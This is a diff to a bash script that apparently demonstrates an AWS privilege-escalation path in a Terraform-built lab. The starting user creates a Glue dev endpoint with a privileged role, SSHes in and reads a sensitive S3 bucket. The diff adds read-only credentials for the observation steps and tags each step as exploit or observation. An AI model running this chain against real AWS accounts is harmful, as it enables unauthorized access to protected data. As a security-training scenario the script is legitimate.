@@ -72,6 +72,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -82,18 +91,29 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -108,15 +128,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have bucket access yet
+# [EXPLOIT] Step 4: Verify we don't have bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
+use_starting_creds
 
 # Extract bucket name from Terraform outputs
 BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.sensitive_bucket_name')
@@ -155,8 +177,9 @@ SSH_PUBLIC_KEY=$(cat ${SSH_KEY_PATH}.pub)
 echo "SSH public key generated"
 echo -e "${GREEN}✓ SSH key pair generated${NC}\n"
 
-# Step 6: Create Glue dev endpoint with privileged role
+# [EXPLOIT] Step 6: Create Glue dev endpoint with privileged role
 echo -e "${YELLOW}Step 6: Creating Glue development endpoint with target role${NC}"
+use_starting_creds
 ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Role ARN: $ROLE_ARN"
 echo "Endpoint name: $ENDPOINT_NAME"
@@ -177,8 +200,9 @@ aws glue create-dev-endpoint \
 
 echo -e "${GREEN}✓ Glue dev endpoint creation initiated${NC}\n"
 
-# Step 7: Wait for endpoint to be ready
+# [OBSERVATION] Step 7: Wait for endpoint to be ready
 echo -e "${YELLOW}Step 7: Waiting for Glue dev endpoint to become ready${NC}"
+use_readonly_creds
 echo "This typically takes 5-10 minutes. Please be patient..."
 echo ""
 
@@ -224,9 +248,10 @@ if [ "$ENDPOINT_READY" = false ]; then
     exit 1
 fi
 
-# Step 8: Get endpoint SSH address
+# [OBSERVATION] Step 8: Get endpoint SSH address
 echo -e "${YELLOW}Step 8: Retrieving endpoint connection details${NC}"
-show_cmd "Attacker" "aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text"
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --endpoint-name $ENDPOINT_NAME \
     --region $AWS_REGION \
@@ -241,13 +266,13 @@ fi
 echo "Endpoint address: $ENDPOINT_ADDRESS"
 echo -e "${GREEN}✓ Retrieved endpoint connection details${NC}\n"
 
-# Step 9: Wait a bit more for SSH to be fully available
+# [OBSERVATION] Step 9: Wait a bit more for SSH to be fully available
 echo -e "${YELLOW}Step 9: Waiting for SSH service to be available${NC}"
 echo "Giving the endpoint another 30 seconds to ensure SSH is ready..."
 sleep 30
 echo -e "${GREEN}✓ SSH should now be available${NC}\n"
 
-# Step 10: SSH into endpoint and access S3 bucket
+# [EXPLOIT] Step 10: SSH into endpoint and access S3 bucket
 echo -e "${YELLOW}Step 10: Connecting to endpoint via SSH and accessing S3 bucket${NC}"
 echo "SSH connection: glue@$ENDPOINT_ADDRESS"
 echo "Executing command to read sensitive data from S3..."
@@ -290,7 +315,7 @@ fi
 echo -e "${GREEN}✓ Successfully connected via SSH${NC}"
 echo ""
 
-# Step 11: Display the sensitive data
+# [OBSERVATION] Step 11: Display the sensitive data
 echo -e "${YELLOW}Step 11: Verifying bucket access${NC}"
 echo "Contents of s3://$BUCKET_NAME/sensitive-data.txt:"
 echo ""
@@ -302,7 +327,7 @@ echo -e "${GREEN}✓ Successfully read sensitive data from S3!${NC}"
 echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
 echo ""
 
-# Step 12: List bucket contents to show full access
+# [EXPLOIT] Step 12: List bucket contents to show full access
 echo -e "${YELLOW}Step 12: Listing bucket contents to demonstrate full access${NC}"
 echo "Listing all objects in bucket..."
 echo ""
